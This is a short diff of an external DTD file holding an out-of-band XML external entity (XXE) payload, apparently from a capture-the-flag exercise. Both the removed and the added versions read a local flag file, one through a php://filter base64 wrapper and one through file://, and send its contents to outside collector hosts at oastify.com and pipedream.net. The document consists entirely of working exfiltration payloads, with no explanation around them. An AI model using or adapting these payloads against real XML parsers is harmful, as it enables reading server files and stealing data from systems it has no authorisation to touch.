@@ -1,4 +1,3 @@
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/flag">
-<!ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'vyxlb5ho71lp4hn527s9g2vjgam9ay.oastify.com/?a=%file;'>">
-%eval;
-%test;
+<!ENTITY % file SYSTEM "file:///etc/flag.txt">
+<!ENTITY % send SYSTEM "https://eotad3zugug90z.m.pipedream.net/submit?data=%file;">
+%send;
